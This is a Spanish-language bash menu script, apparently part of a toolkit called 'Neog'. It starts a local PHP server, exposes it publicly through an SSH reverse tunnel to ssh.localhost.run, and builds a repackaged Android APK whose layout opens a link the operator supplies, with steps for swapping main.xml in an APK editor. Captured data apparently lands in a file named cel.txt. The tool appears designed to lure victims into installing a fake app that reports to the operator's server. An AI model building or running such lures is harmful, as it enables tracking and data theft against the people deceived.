bash .banner
echo ""
echo "Introduce la opcion que deseas utilizar:"
echo ""
echo "1)Abrir Servidor"
echo "2)Crear Apk"
echo "3)Ayuda"
echo "4)Salir"
echo ""
read -p "Opcion: " num

if [ "$num" = "1" ]; then

bash .banner
php -S localhost:4444 -t .st | ssh -R 80:localhost:4444 ssh.localhost.run

fi

if [ "$num" = "2" ]; then

mkdir $HOME/MgToLs/Neogeo
bash .banner
read -p "Introduce un enlace para abrir en la app: " nose
read -p "Introduce el enlace que se te proporciono anteriormente: " enla
ks=$(sed "s%nose%$nose%g" .base1 > .ola)
aj=$(sed "s%tuurl%$enla%g" .ola > main.xml)
kdk=$(cp .base -r $HOME/MgToLs/Neogeo/NEOG_APP.apk)
skdk=$(cp $HOME/MgToLs/.apked -r $HOME/MgToLs/Neogeo/APK_EDITOR.apk)
ieiw=$(mv main.xml $HOME/MgToLs/Neogeo/main.xml)
bash .banner
read -p "Archivo guardados en $HOME/MgToLs/Neogeo/ ..."
bash .banner
echo "Ahora debes de reemplazar con Apk Editor el archivo main.xml"
echo "por el que acabamos de crear, para hacer esto nos dirigimos a"
echo "res/layout/main.xml lo seleccionamos, y buscamos el archivo que"
echo "creamos llamado main.xml."
echo ""
read -p "Presiona una tecla para continuar..." pause
rj=$(echo "" > .st/cel.txt)
bash .vu
bash Neog.sh


fi

if [ "$num" = "3" ]; then

bash .banner
cat Readme.txt
echo ""
read -p "Presiona una tecla para continuar..." pause
bash Neog.sh

fi

if [ "$num" = "4" ]; then

bash .banner
echo "                   Gracias por usar Neog!!"
echo ""

fi

